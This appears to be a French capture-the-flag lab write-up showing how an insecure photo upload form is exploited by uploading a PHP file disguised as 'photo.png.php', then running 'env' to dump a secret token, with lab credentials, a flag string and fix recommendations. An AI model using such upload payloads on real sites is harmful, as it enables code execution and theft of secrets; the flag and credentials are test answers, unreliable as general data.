# Étape 03 — Hacker vaillant

## Objectif
Se connecter en tant qu'admin.

## Faille / Catégorie OWASP
**A04:2021 – Insecure Design > CWE-434: Unrestricted Upload of File with Dangerous Type**

## Démarche d'exploitation
1. Inspection de la page d'accueil → URL de l'image de fond : `images/bg.jpg`
2. Identification du serveur : Apache/2.4.25 (Debian)
3. Le formulaire d'upload de photos n'est pas sécurisé : ajouter `.jpg` ou `.png` à la fin du nom d'un fichier PHP suffit à le faire passer pour une image

**Exploitation :**

Upload d'un fichier `photo.png.php` contenant :
```php
<?php echo "it works!"; ?>
```
Accès à `/images/photo.png.php` → le code est bien exécuté.

Découverte du fichier `run.sh` via `ls` :
```
certificat=$STEP_TOKEN
login="etna"
password="8765GxAx@"
database="etna"
```
Le certificat est stocké dans une variable d'environnement. Récupération via :
```php
<?php exec('env', $output); print_r($output); ?>
```

## Recommandations
- Restreindre le type de fichier autorisé à l'upload sur la base du type MIME (`image/png`, `image/jpeg`), et non de l'extension
- Déplacer cette évaluation côté serveur et mettre en place une vérification dans le `.htaccess`
- Renommer automatiquement les fichiers uploadés pour éviter l'exécution directe via l'URL
- Enregistrer les fichiers dans un répertoire non accessible par le serveur web

## Certificat
`cc689cf81171b1f4388f8fe8e07480b7b97e4fd30467b1a0387ce714d0e62ceed0b8637797ce557c`
